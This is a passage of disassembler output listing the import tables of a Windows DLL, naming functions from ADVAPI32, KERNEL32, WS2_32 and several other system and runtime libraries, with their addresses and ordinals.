		dd rva word_6AF647DC
		dd rva word_6AF647EE
		dd rva word_6AF64806
		dd rva word_6AF64814
		dd rva word_6AF64826
		dd rva word_6AF6483A
		dd rva word_6AF6484C
		dd rva word_6AF6485C
		dd rva word_6AF6486C
		dd rva word_6AF6487E
		dd rva word_6AF6488E
		dd rva word_6AF648A4
		dd rva word_6AF648BC
		dd rva word_6AF648CE
		dd rva word_6AF648E0
		dd rva word_6AF648F0
		dd rva word_6AF64900
		dd rva word_6AF64914
		dd rva word_6AF64932
		dd rva word_6AF64952
		dd 0
word_6AF646A8	dw 0			; DATA XREF: .rdata:ADVAPI32_dll_dinto
aFreesid	db 'FreeSid',0
word_6AF646B2	dw 0			; DATA XREF: .rdata:6AF6461Co
aSetsecuritydes	db 'SetSecurityDescriptorDacl',0
word_6AF646CE	dw 0			; DATA XREF: .rdata:6AF64620o
aAddaccessallow	db 'AddAccessAllowedAce',0
word_6AF646E4	dw 0			; DATA XREF: .rdata:6AF64624o
aInitializeacl	db 'InitializeAcl',0
word_6AF646F4	dw 0			; DATA XREF: .rdata:6AF64628o
aInitializesecu	db 'InitializeSecurityDescriptor',0
		align 4
word_6AF64714	dw 0			; DATA XREF: .rdata:6AF6462Co
aGetlengthsid	db 'GetLengthSid',0
		db 56h
word_6AF64724	dw 0			; DATA XREF: .rdata:6AF64630o
aAllocateandini	db 'AllocateAndInitializeSid',0
		db 13h
word_6AF64740	dw 0			; DATA XREF: .rdata:6AF64634o
aDeregistereven	db 'DeregisterEventSource',0
word_6AF64758	dw 0			; DATA XREF: .rdata:6AF64638o
aReporteventa	db 'ReportEventA',0
		db 56h
word_6AF64768	dw 0			; DATA XREF: .rdata:6AF6463Co
aLookupaccountn	db 'LookupAccountNameA',0
		db 2Eh
word_6AF6477E	dw 0			; DATA XREF: .rdata:6AF64640o
aGetusernamea	db 'GetUserNameA',0
		db 56h
word_6AF6478E	dw 0			; DATA XREF: .rdata:6AF64644o
aRegisterevents	db 'RegisterEventSourceA',0
		db 6Ch
word_6AF647A6	dw 0			; DATA XREF: .rdata:6AF64648o
aEqualsid	db 'EqualSid',0
		align 2
word_6AF647B2	dw 0			; DATA XREF: .rdata:6AF6464Co
aGettokeninform	db 'GetTokenInformation',0
word_6AF647C8	dw 0			; DATA XREF: .rdata:6AF64650o
aOpenprocesstok	db 'OpenProcessToken',0
		db 33h
word_6AF647DC	dw 0			; DATA XREF: .rdata:6AF64654o
aOpenthreadtoke	db 'OpenThreadToken',0
word_6AF647EE	dw 0			; DATA XREF: .rdata:6AF64658o
aChecktokenmemb	db 'CheckTokenMembership',0
		db 6Ch
word_6AF64806	dw 0			; DATA XREF: .rdata:6AF6465Co
aRegclosekey	db 'RegCloseKey',0
word_6AF64814	dw 0			; DATA XREF: .rdata:6AF64660o
aRegdeletevalue	db 'RegDeleteValueA',0
word_6AF64826	dw 0			; DATA XREF: .rdata:6AF64664o
aRegqueryvaluee	db 'RegQueryValueExA',0
		db 33h
word_6AF6483A	dw 0			; DATA XREF: .rdata:6AF64668o
aRegsetvalueexa	db 'RegSetValueExA',0
		db 50h
word_6AF6484C	dw 0			; DATA XREF: .rdata:6AF6466Co
aRegenumvaluea	db 'RegEnumValueA',0
word_6AF6485C	dw 0			; DATA XREF: .rdata:6AF64670o
aRegenumkeyexa	db 'RegEnumKeyExA',0
word_6AF6486C	dw 0			; DATA XREF: .rdata:6AF64674o
aRegcreatekeyex	db 'RegCreateKeyExA',0
word_6AF6487E	dw 0			; DATA XREF: .rdata:6AF64678o
aRegopenkeyexa	db 'RegOpenKeyExA',0
word_6AF6488E	dw 0			; DATA XREF: .rdata:6AF6467Co
aCloseserviceha	db 'CloseServiceHandle',0
		db 2Eh
word_6AF648A4	dw 0			; DATA XREF: .rdata:6AF64680o
aChangeservicec	db 'ChangeServiceConfig2A',0
word_6AF648BC	dw 0			; DATA XREF: .rdata:6AF64684o
aCreateservicea	db 'CreateServiceA',0
		db 50h
word_6AF648CE	dw 0			; DATA XREF: .rdata:6AF64688o
aOpenscmanagera	db 'OpenSCManagerA',0
		db 50h
word_6AF648E0	dw 0			; DATA XREF: .rdata:6AF6468Co
aDeleteservice	db 'DeleteService',0
word_6AF648F0	dw 0			; DATA XREF: .rdata:6AF64690o
aOpenservicea	db 'OpenServiceA',0
		db 56h
word_6AF64900	dw 0			; DATA XREF: .rdata:6AF64694o
aSetservicestat	db 'SetServiceStatus',0
		db 33h
word_6AF64914	dw 0			; DATA XREF: .rdata:6AF64698o
aRegisterservic	db 'RegisterServiceCtrlHandlerA',0
word_6AF64932	dw 0			; DATA XREF: .rdata:6AF6469Co
aRegisterserv_0	db 'RegisterServiceCtrlHandlerExA',0
word_6AF64952	dw 0			; DATA XREF: .rdata:6AF646A0o
aStartservicect	db 'StartServiceCtrlDispatcherA',0
ADVAPI32_dll_dbiat dd 0			; DATA XREF: .rdata:6AF645ECo
					; ADVAPI32.dll bound delayed import address table
		dd 23h dup(0)
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_6AF64ADC ; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva InterlockedExchange ; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_6AF64E34 ; Import	Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva UnregisterClassA	; Import Address Table
__IMPORT_DESCRIPTOR_SHELL32 dd rva off_6AF64E0C	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aShell32_dll	; DLL Name
		dd rva SHGetSpecialFolderPathA ; Import	Address	Table
__IMPORT_DESCRIPTOR_ole32 dd rva off_6AF64F04 ;	Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aOle32_dll	; DLL Name
		dd rva CreateStreamOnHGlobal ; Import Address Table
__IMPORT_DESCRIPTOR_OLEAUT32 dd	rva dword_6AF64DC4 ; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aOleaut32_dll	; DLL Name
		dd rva SafeArrayCreateVector ; Import Address Table
__IMPORT_DESCRIPTOR_MSVCP71 dd rva off_6AF64CDC	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aMsvcp71_dll	; DLL Name
		dd rva ?sync_with_stdio@ios_base@std@@SA_N_N@Z ; Import	Address	Table
__IMPORT_DESCRIPTOR_SHLWAPI dd rva off_6AF64E14	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aShlwapi_dll	; DLL Name
		dd rva PathAddBackslashA ; Import Address Table
__IMPORT_DESCRIPTOR_MSVCR71 dd rva off_6AF64CF4	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aMsvcr71_dll	; DLL Name
		dd rva __imp__initterm	; Import Address Table
__IMPORT_DESCRIPTOR_WS2_32 dd rva dword_6AF64E98 ; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aWs2_32_dll	; DLL Name
		dd rva WSAGetLastError	; Import Address Table
__IMPORT_DESCRIPTOR_VERSION dd rva off_6AF64E88	; Import Name Table
		dd 0FFFFFFFFh		; Time stamp
		dd 0FFFFFFFFh		; Forwarder Chain
		dd rva aVersion_dll	; DLL Name
		dd rva __imp_GetFileVersionInfoSizeA ; Import Address Table
		dd 5 dup(0)
;
; Import names for KERNEL32.dll
;
off_6AF64ADC	dd rva word_6AF64F24	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_6AF64F3A
		dd rva word_6AF64F44
		dd rva word_6AF64F56
		dd rva word_6AF64F68
		dd rva word_6AF64F78
		dd rva word_6AF64F8E
		dd rva word_6AF64FA4
		dd rva word_6AF64FB6
		dd rva word_6AF64FC6
		dd rva word_6AF64FE2
		dd rva word_6AF64FFA
		dd rva word_6AF65006
		dd rva word_6AF65012
		dd rva word_6AF65024
		dd rva word_6AF65034
		dd rva word_6AF65044
		dd rva word_6AF65054
		dd rva word_6AF65066
		dd rva word_6AF65074
		dd rva word_6AF65086
		dd rva word_6AF65096
		dd rva word_6AF650A2
		dd rva word_6AF650B8
		dd rva word_6AF650C6
		dd rva word_6AF650D6
		dd rva word_6AF650E4
		dd rva word_6AF650F2
		dd rva word_6AF65100
		dd rva word_6AF65110
		dd rva word_6AF6511C
		dd rva word_6AF65128
		dd rva word_6AF6513E
		dd rva word_6AF65150
		dd rva word_6AF65164
		dd rva word_6AF65170
		dd rva word_6AF65184
		dd rva word_6AF651A4
		dd rva word_6AF651B8
		dd rva word_6AF651C6
		dd rva word_6AF651D6
		dd rva word_6AF651E8
		dd rva word_6AF65200
		dd rva word_6AF65212
		dd rva word_6AF65230
		dd rva word_6AF65240
		dd rva word_6AF65250
		dd rva word_6AF6525E
		dd rva word_6AF6527C
		dd rva word_6AF6529C
		dd rva word_6AF652B8
		dd rva word_6AF652D6
		dd rva word_6AF652F4
		dd rva word_6AF6530E
		dd rva word_6AF65326
		dd rva word_6AF6533E
		dd rva word_6AF65356
		dd rva word_6AF65372
		dd rva word_6AF65392
		dd rva word_6AF653A2
		dd rva word_6AF653B6
		dd rva word_6AF653CA
		dd rva word_6AF653E0
		dd rva word_6AF653F4
		dd rva word_6AF65408
		dd rva word_6AF65420
		dd rva word_6AF65438
		dd rva word_6AF6544A
		dd rva word_6AF65458
		dd rva word_6AF6546E
		dd rva word_6AF65484
		dd rva word_6AF65490
		dd rva word_6AF654A2
		dd rva word_6AF654C0
		dd rva word_6AF654D4
		dd rva word_6AF654E2
		dd rva word_6AF654F2
		dd rva word_6AF65500
		dd rva word_6AF65514
		dd rva word_6AF6552A
		dd rva word_6AF6553C
		dd rva word_6AF65550
		dd rva word_6AF65560
		dd rva word_6AF6556C
		dd rva word_6AF6557E
		dd rva word_6AF6558C
		dd rva word_6AF65598
		dd rva word_6AF655A4
		dd rva word_6AF655B4
		dd rva word_6AF655C4
		dd rva word_6AF655D2
		dd rva word_6AF655E4
		dd rva word_6AF655F2
		dd rva word_6AF6560A
		dd rva word_6AF65620
		dd rva word_6AF65630
		dd rva word_6AF6563C
		dd rva word_6AF65654
		dd rva word_6AF65668
		dd rva word_6AF6567C
		dd rva word_6AF6568C
		dd rva word_6AF656A8
		dd rva word_6AF656C2
		dd rva word_6AF656D6
		dd rva word_6AF656E6
		dd rva word_6AF656F2
		dd rva word_6AF65700
		dd rva word_6AF6570E
		dd rva word_6AF65722
		dd rva word_6AF65734
		dd rva word_6AF65744
		dd rva word_6AF65752
		dd rva word_6AF65762
		dd rva word_6AF65770
		dd rva word_6AF6577E
		dd rva word_6AF6578E
		dd rva word_6AF6579E
		dd rva word_6AF657B2
		dd rva word_6AF657C6
		dd rva word_6AF657D4
		dd rva word_6AF657E4
		dd rva word_6AF657F6
		dd rva word_6AF65810
		dd rva word_6AF6601C
		dd rva word_6AF6602A
		dd rva word_6AF66038
		dd rva word_6AF66052
		dd 0
;
; Import names for MSVCP71.dll
;
off_6AF64CDC	dd rva word_6AF65B5A	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCP71o
		dd rva word_6AF65B0E
		dd rva word_6AF65AC4
		dd rva word_6AF65A74
		dd rva word_6AF65B90
		dd 0
;
; Import names for MSVCR71.dll
;
off_6AF64CF4	dd rva word_6AF65F3E	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCR71o
		dd rva word_6AF65F2A
		dd rva word_6AF65F12
		dd rva word_6AF65EFC
		dd rva word_6AF65CF8
		dd rva word_6AF65EEE
		dd rva word_6AF65EE2
		dd rva word_6AF65ED0
		dd rva word_6AF65EC2
		dd rva word_6AF65EB2
		dd rva word_6AF65E96
		dd rva word_6AF65E78
		dd rva word_6AF65E60
		dd rva word_6AF65E38
		dd rva word_6AF65E1E
		dd rva word_6AF65E0E
		dd rva word_6AF65DF2
		dd rva word_6AF65DD6
		dd rva word_6AF65DCC
		dd rva word_6AF65DBE
		dd rva word_6AF65F4A
		dd rva word_6AF65DA2
		dd rva word_6AF65D98
		dd rva word_6AF65D90
		dd rva word_6AF65CEC
		dd rva word_6AF65CDE
		dd rva word_6AF65CD2
		dd rva word_6AF65CC8
		dd rva word_6AF65CB0
		dd rva word_6AF65C98
		dd rva word_6AF65C88
		dd rva word_6AF65C74
		dd rva word_6AF65C6A
		dd rva word_6AF65D16
		dd rva word_6AF65C54
		dd rva word_6AF65C40
		dd rva word_6AF65C38
		dd rva word_6AF65C2E
		dd rva word_6AF65D3C
		dd rva word_6AF65D46
		dd rva word_6AF65F5A
		dd rva word_6AF65D02
		dd rva word_6AF65D0C
		dd rva word_6AF65DB4
		dd rva word_6AF65D20
		dd rva word_6AF65D86
		dd rva word_6AF65D7A
		dd rva word_6AF65D70
		dd rva word_6AF65D66
		dd rva word_6AF65D5C
		dd rva word_6AF65D52
		dd 0
;
; Import names for OLEAUT32.dll
;
dword_6AF64DC4	dd 8000019Bh		; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_OLEAUT32o
		dd 80000017h
		dd 80000018h
		dd 8000000Fh
		dd 80000015h
		dd 80000094h
		dd 80000019h
		dd 80000016h
		dd 80000028h
		dd 80000006h
		dd 80000002h
		dd 80000096h
		dd 80000095h
		dd 80000008h
		dd 80000009h
		dd 8000000Bh
		dd 8000001Ah
		dd 0
;
; Import names for SHELL32.dll
;
off_6AF64E0C	dd rva word_6AF659A8	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_SHELL32o
		dd 0
;
; Import names for SHLWAPI.dll
;
off_6AF64E14	dd rva word_6AF65BEA	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_SHLWAPIo
		dd rva word_6AF65C0E
		dd rva word_6AF65BCC
		dd rva word_6AF65BC0
		dd rva word_6AF65BA8
		dd rva word_6AF65BDC
		dd rva word_6AF65BFE
		dd 0
;
; Import names for USER32.dll
;
off_6AF64E34	dd rva word_6AF65836	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_6AF6584A
		dd rva word_6AF65856
		dd rva word_6AF658DA
		dd rva word_6AF6598C
		dd rva word_6AF6596E
		dd rva word_6AF6595C
		dd rva word_6AF65948
		dd rva word_6AF65936
		dd rva word_6AF65922
		dd rva word_6AF65910
		dd rva word_6AF658FE
		dd rva word_6AF658EC
		dd rva word_6AF658CC
		dd rva word_6AF658B8
		dd rva word_6AF658A4
		dd rva word_6AF65894
		dd rva word_6AF65884
		dd rva word_6AF6586E
		dd rva word_6AF65862
		dd 0
;
; Import names for VERSION.dll
;
off_6AF64E88	dd rva word_6AF65FF6	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_VERSIONo
		dd rva word_6AF65FCE
		dd rva word_6AF65FE0
		dd 0
;
; Import names for WS2_32.dll
;
dword_6AF64E98	dd 8000006Fh		; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WS2_32o
		dd 80000074h
		dd 80000002h
		dd rva word_6AF65F6C
		dd 8000000Dh
		dd rva word_6AF65F7A
		dd rva word_6AF65F86
		dd rva word_6AF65F90
		dd rva word_6AF65FAA
		dd 80000016h
		dd 80000073h
		dd 80000015h
		dd 80000007h
		dd 8000000Ah
		dd 80000006h
		dd 80000005h
		dd 80000012h
		dd 8000000Ch
		dd 80000033h
		dd 80000034h
		dd 8000000Bh
		dd rva word_6AF65FB4
		dd 8000000Fh
		dd 80000003h
		dd 80000008h
		dd 80000009h
		dd 0
;
; Import names for ole32.dll
;
off_6AF64F04	dd rva word_6AF659E2	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ole32o
		dd rva word_6AF659FA
		dd rva word_6AF65A12
		dd rva word_6AF65A24
		dd rva word_6AF65A36
		dd rva word_6AF65A48
		dd rva word_6AF659CE
		dd 0
word_6AF64F24	dw 21Fh			; DATA XREF: .rdata:off_6AF64ADCo
		db 'InterlockedExchange',0
word_6AF64F3A	dw 0F5h			; DATA XREF: .rdata:6AF64AE0o
		db 'GetACP',0
		align 4
word_6AF64F44	dw 16Ch			; DATA XREF: .rdata:6AF64AE4o
		db 'GetLocaleInfoA',0
		align 2
word_6AF64F56	dw 1D0h			; DATA XREF: .rdata:6AF64AE8o
		db 'GetThreadLocale',0
word_6AF64F68	dw 1DFh			; DATA XREF: .rdata:6AF64AECo
		db 'GetVersionExA',0
word_6AF64F78	dw 26Bh			; DATA XREF: .rdata:6AF64AF0o
		db 'MultiByteToWideChar',0
word_6AF64F8E	dw 389h			; DATA XREF: .rdata:6AF64AF4o
		db 'WideCharToMultiByte',0
word_6AF64FA4	dw 29Dh			; DATA XREF: .rdata:6AF64AF8o
		db 'RaiseException',0
		align 2
word_6AF64FB6	dw 169h			; DATA XREF: .rdata:6AF64AFCo
		db 'GetLastError',0
		align 2
word_6AF64FC6	dw 219h			; DATA XREF: .rdata:6AF64B00o
		db 'InitializeCriticalSection',0
word_6AF64FE2	dw 7Ah			; DATA XREF: .rdata:6AF64B04o
		db 'DeleteCriticalSection',0
word_6AF64FFA	dw 3C0h			; DATA XREF: .rdata:6AF64B08o
		db 'lstrlenW',0
		align 2
word_6AF65006	dw 3BFh			; DATA XREF: .rdata:6AF64B0Co
		db 'lstrlenA',0
		align 2
word_6AF65012	dw 348h			; DATA XREF: .rdata:6AF64B10o
		db 'SizeofResource',0
		align 4
word_6AF65024	dw 25Bh			; DATA XREF: .rdata:6AF64B14o
		db 'LockResource',0
		align 4
word_6AF65034	dw 24Dh			; DATA XREF: .rdata:6AF64B18o
		db 'LoadResource',0
		align 4
word_6AF65044	dw 0DAh			; DATA XREF: .rdata:6AF64B1Co
		db 'FindResourceA',0
word_6AF65054	dw 0DBh			; DATA XREF: .rdata:6AF64B20o
		db 'FindResourceExA',0
word_6AF65066	dw 0EFh			; DATA XREF: .rdata:6AF64B24o
		db 'FreeLibrary',0
word_6AF65074	dw 198h			; DATA XREF: .rdata:6AF64B28o
		db 'GetProcAddress',0
		align 2
word_6AF65086	dw 248h			; DATA XREF: .rdata:6AF64B2Co
		db 'LoadLibraryA',0
		align 2
word_6AF65096	dw 3B0h			; DATA XREF: .rdata:6AF64B30o
		db 'lstrcatA',0
		align 2
word_6AF650A2	dw 1B9h			; DATA XREF: .rdata:6AF64B34o
		db 'GetSystemDirectoryA',0
word_6AF650B8	dw 1F5h			; DATA XREF: .rdata:6AF64B38o
		db 'GlobalFree',0
		align 2
word_6AF650C6	dw 200h			; DATA XREF: .rdata:6AF64B3Co
		db 'GlobalUnlock',0
		align 2
word_6AF650D6	dw 1F9h			; DATA XREF: .rdata:6AF64B40o
		db 'GlobalLock',0
		align 4
word_6AF650E4	dw 1EEh			; DATA XREF: .rdata:6AF64B44o
		db 'GlobalAlloc',0
word_6AF650F2	dw 1FDh			; DATA XREF: .rdata:6AF64B48o
		db 'GlobalSize',0
		align 10h
word_6AF65100	dw 16Bh			; DATA XREF: .rdata:6AF64B4Co
		db 'GetLocalTime',0
		align 10h
word_6AF65110	dw 397h			; DATA XREF: .rdata:6AF64B50o
		db 'WriteFile',0
word_6AF6511C	dw 2ABh			; DATA XREF: .rdata:6AF64B54o
		db 'ReadFile',0
		align 4
word_6AF65128	dw 13Eh			; DATA XREF: .rdata:6AF64B58o
		db 'GetCurrentThreadId',0
		align 2
word_6AF6513E	dw 108h			; DATA XREF: .rdata:6AF64B5Co
		db 'GetCommandLineA',0
word_6AF65150	dw 2FBh			; DATA XREF: .rdata:6AF64B60o
		db 'SetConsoleTitleA',0
		align 4
word_6AF65164	dw 3B9h			; DATA XREF: .rdata:6AF64B64o
		db 'lstrcpyA',0
		align 10h
word_6AF65170	dw 131h			; DATA XREF: .rdata:6AF64B68o
		db 'GetConsoleTitleA',0
		align 4
word_6AF65184	dw 189h			; DATA XREF: .rdata:6AF64B6Co
		db 'GetNumberOfConsoleInputEvents',0
word_6AF651A4	dw 2A0h			; DATA XREF: .rdata:6AF64B70o
		db 'ReadConsoleInputA',0
word_6AF651B8	dw 0ECh			; DATA XREF: .rdata:6AF64B74o
		db 'FreeConsole',0
word_6AF651C6	dw 32Ch			; DATA XREF: .rdata:6AF64B78o
		db 'SetStdHandle',0
		align 2
word_6AF651D6	dw 2F2h			; DATA XREF: .rdata:6AF64B7Co
		db 'SetConsoleMode',0
		align 4
word_6AF651E8	dw 2E3h			; DATA XREF: .rdata:6AF64B80o
		db 'SetConsoleCtrlHandler',0
word_6AF65200	dw 12Bh			; DATA XREF: .rdata:6AF64B84o
		db 'GetConsoleMode',0
		align 2
word_6AF65212	dw 12Fh			; DATA XREF: .rdata:6AF64B88o
		db 'GetConsoleScreenBufferInfo',0
		align 10h
word_6AF65230	dw 1B1h			; DATA XREF: .rdata:6AF64B8Co
		db 'GetStdHandle',0
		align 10h
word_6AF65240	dw 9			; DATA XREF: .rdata:6AF64B90o
		db 'AllocConsole',0
		align 10h
word_6AF65250	dw 2Eh			; DATA XREF: .rdata:6AF64B94o
		db 'CloseHandle',0
word_6AF6525E	dw 0BDh			; DATA XREF: .rdata:6AF64B98o
		db 'FillConsoleOutputAttribute',0
		align 4
word_6AF6527C	dw 393h			; DATA XREF: .rdata:6AF64B9Co
		db 'WriteConsoleOutputCharacterA',0
		align 4
word_6AF6529C	dw 2E7h			; DATA XREF: .rdata:6AF64BA0o
		db 'SetConsoleCursorPosition',0
		align 4
word_6AF652B8	dw 0BEh			; DATA XREF: .rdata:6AF64BA4o
		db 'FillConsoleOutputCharacterA',0
word_6AF652D6	dw 2F9h			; DATA XREF: .rdata:6AF64BA8o
		db 'SetConsoleScreenBufferSize',0
		align 4
word_6AF652F4	dw 2FAh			; DATA XREF: .rdata:6AF64BACo
		db 'SetConsoleTextAttribute',0
word_6AF6530E	dw 2E5h			; DATA XREF: .rdata:6AF64BB0o
		db 'SetConsoleCursorInfo',0
		align 2
word_6AF65326	dw 120h			; DATA XREF: .rdata:6AF64BB4o
		db 'GetConsoleCursorInfo',0
		align 2
word_6AF6533E	dw 2FDh			; DATA XREF: .rdata:6AF64BB8o
		db 'SetConsoleWindowInfo',0
		align 2
word_6AF65356	dw 44h			; DATA XREF: .rdata:6AF64BBCo
		db 'CreateConsoleScreenBuffer',0
word_6AF65372	dw 2E0h			; DATA XREF: .rdata:6AF64BC0o
		db 'SetConsoleActiveScreenBuffer',0
		align 2
word_6AF65392	dw 38Ch			; DATA XREF: .rdata:6AF64BC4o
		db 'WriteConsoleA',0
word_6AF653A2	dw 351h			; DATA XREF: .rdata:6AF64BC8o
		db 'TerminateProcess',0
		align 2
word_6AF653B6	dw 13Ah			; DATA XREF: .rdata:6AF64BCCo
		db 'GetCurrentProcess',0
word_6AF653CA	dw 13Bh			; DATA XREF: .rdata:6AF64BD0o
		db 'GetCurrentProcessId',0
word_6AF653E0	dw 1CDh			; DATA XREF: .rdata:6AF64BD4o
		db 'GetThreadContext',0
		align 4
word_6AF653F4	dw 13Dh			; DATA XREF: .rdata:6AF64BD8o
		db 'GetCurrentThread',0
		align 4
word_6AF65408	dw 8Fh			; DATA XREF: .rdata:6AF64BDCo
		db 'EnterCriticalSection',0
		align 10h
word_6AF65420	dw 247h			; DATA XREF: .rdata:6AF64BE0o
		db 'LeaveCriticalSection',0
		align 4
word_6AF65438	dw 310h			; DATA XREF: .rdata:6AF64BE4o
		db 'SetFilePointer',0
		align 2
word_6AF6544A	dw 4Dh			; DATA XREF: .rdata:6AF64BE8o
		db 'CreateFileA',0
word_6AF65458	dw 175h			; DATA XREF: .rdata:6AF64BECo
		db 'GetModuleFileNameA',0
		align 2
word_6AF6546E	dw 283h			; DATA XREF: .rdata:6AF64BF0o
		db 'OutputDebugStringA',0
		align 4
word_6AF65484	dw 252h			; DATA XREF: .rdata:6AF64BF4o
		db 'LocalFree',0
word_6AF65490	dw 0EAh			; DATA XREF: .rdata:6AF64BF8o
		db 'FormatMessageA',0
		align 2
word_6AF654A2	dw 33Dh			; DATA XREF: .rdata:6AF64BFCo
		db 'SetUnhandledExceptionFilter',0
word_6AF654C0	dw 0E5h			; DATA XREF: .rdata:6AF64C00o
		db 'FlushFileBuffers',0
		align 4
word_6AF654D4	dw 15Bh			; DATA XREF: .rdata:6AF64C04o
		db 'GetFileSize',0
word_6AF654E2	dw 305h			; DATA XREF: .rdata:6AF64C08o
		db 'SetEndOfFile',0
		align 2
word_6AF654F2	dw 7Ch			; DATA XREF: .rdata:6AF64C0Co
		db 'DeleteFileA',0
word_6AF65500	dw 45h			; DATA XREF: .rdata:6AF64C10o
		db 'CreateDirectoryA',0
		align 4
word_6AF65514	dw 156h			; DATA XREF: .rdata:6AF64C14o
		db 'GetFileAttributesA',0
		align 2
word_6AF6552A	dw 8Ch			; DATA XREF: .rdata:6AF64C18o
		db 'DuplicateHandle',0
word_6AF6553C	dw 177h			; DATA XREF: .rdata:6AF64C1Co
		db 'GetModuleHandleA',0
		align 10h
word_6AF65550	dw 31Dh			; DATA XREF: .rdata:6AF64C20o
		db 'SetLastError',0
		align 10h
word_6AF65560	dw 20Ch			; DATA XREF: .rdata:6AF64C24o
		db 'HeapFree',0
		align 4
word_6AF6556C	dw 19Bh			; DATA XREF: .rdata:6AF64C28o
		db 'GetProcessHeap',0
		align 2
word_6AF6557E	dw 378h			; DATA XREF: .rdata:6AF64C2Co
		db 'VirtualFree',0
word_6AF6558C	dw 212h			; DATA XREF: .rdata:6AF64C30o
		db 'HeapSize',0
		align 4
word_6AF65598	dw 206h			; DATA XREF: .rdata:6AF64C34o
		db 'HeapAlloc',0
word_6AF655A4	dw 375h			; DATA XREF: .rdata:6AF64C38o
		db 'VirtualAlloc',0
		align 4
word_6AF655B4	dw 1BBh			; DATA XREF: .rdata:6AF64C3Co
		db 'GetSystemInfo',0
word_6AF655C4	dw 210h			; DATA XREF: .rdata:6AF64C40o
		db 'HeapReAlloc',0
word_6AF655D2	dw 249h			; DATA XREF: .rdata:6AF64C44o
		db 'LoadLibraryExA',0
		align 4
word_6AF655E4	dw 24Eh			; DATA XREF: .rdata:6AF64C48o
		db 'LocalAlloc',0
		align 2
word_6AF655F2	dw 21Eh			; DATA XREF: .rdata:6AF64C4Co
		db 'InterlockedDecrement',0
		align 2
word_6AF6560A	dw 385h			; DATA XREF: .rdata:6AF64C50o
		db 'WaitForSingleObject',0
word_6AF65620	dw 30Ah			; DATA XREF: .rdata:6AF64C54o
		db 'SetErrorMode',0
		align 10h
word_6AF65630	dw 24h			; DATA XREF: .rdata:6AF64C58o
		db 'CancelIo',0
		align 4
word_6AF6563C	dw 1E9h			; DATA XREF: .rdata:6AF64C5Co
		db 'GetWindowsDirectoryA',0
		align 4
word_6AF65654	dw 172h			; DATA XREF: .rdata:6AF64C60o
		db 'GetLongPathNameA',0
		align 4
word_6AF65668	dw 1ADh			; DATA XREF: .rdata:6AF64C64o
		db 'GetShortPathNameA',0
word_6AF6567C	dw 1D5h			; DATA XREF: .rdata:6AF64C68o
		db 'GetTickCount',0
		align 4
word_6AF6568C	dw 384h			; DATA XREF: .rdata:6AF64C6Co
		db 'WaitForMultipleObjectsEx',0
		align 4
word_6AF656A8	dw 35Eh			; DATA XREF: .rdata:6AF64C70o
		db 'TryEnterCriticalSection',0
word_6AF656C2	dw 2B9h			; DATA XREF: .rdata:6AF64C74o
		db 'ReleaseSemaphore',0
		align 2
word_6AF656D6	dw 2B8h			; DATA XREF: .rdata:6AF64C78o
		db 'ReleaseMutex',0
		align 2
word_6AF656E6	dw 30Bh			; DATA XREF: .rdata:6AF64C7Co
		db 'SetEvent',0
		align 2
word_6AF656F2	dw 291h			; DATA XREF: .rdata:6AF64C80o
		db 'PulseEvent',0
		align 10h
word_6AF65700	dw 2C4h			; DATA XREF: .rdata:6AF64C84o
		db 'ResetEvent',0
		align 2
word_6AF6570E	dw 65h			; DATA XREF: .rdata:6AF64C88o
		db 'CreateSemaphoreA',0
		align 2
word_6AF65722	dw 27Eh			; DATA XREF: .rdata:6AF64C8Co
		db 'OpenSemaphoreA',0
		align 4
word_6AF65734	dw 5Ah			; DATA XREF: .rdata:6AF64C90o
		db 'CreateMutexA',0
		align 4
word_6AF65744	dw 27Ah			; DATA XREF: .rdata:6AF64C94o
		db 'OpenMutexA',0
		align 2
word_6AF65752	dw 49h			; DATA XREF: .rdata:6AF64C98o
		db 'CreateEventA',0
		align 2
word_6AF65762	dw 273h			; DATA XREF: .rdata:6AF64C9Co
		db 'OpenEventA',0
		align 10h
word_6AF65770	dw 27Ch			; DATA XREF: .rdata:6AF64CA0o
		db 'OpenProcess',0
word_6AF6577E	dw 34Bh			; DATA XREF: .rdata:6AF64CA4o
		db 'SuspendThread',0
word_6AF6578E	dw 2C7h			; DATA XREF: .rdata:6AF64CA8o
		db 'ResumeThread',0
		align 2
word_6AF6579E	dw 338h			; DATA XREF: .rdata:6AF64CACo
		db 'SetThreadPriority',0
word_6AF657B2	dw 1D1h			; DATA XREF: .rdata:6AF64CB0o
		db 'GetThreadPriority',0
word_6AF657C6	dw 0B0h			; DATA XREF: .rdata:6AF64CB4o
		db 'ExitThread',0
		align 4
word_6AF657D4	dw 69h			; DATA XREF: .rdata:6AF64CB8o
		db 'CreateThread',0
		align 4
word_6AF657E4	dw 352h			; DATA XREF: .rdata:6AF64CBCo
		db 'TerminateThread',0
word_6AF657F6	dw 220h			; DATA XREF: .rdata:6AF64CC0o
		db 'InterlockedExchangeAdd',0
		align 10h
word_6AF65810	dw 222h			; DATA XREF: .rdata:6AF64CC4o
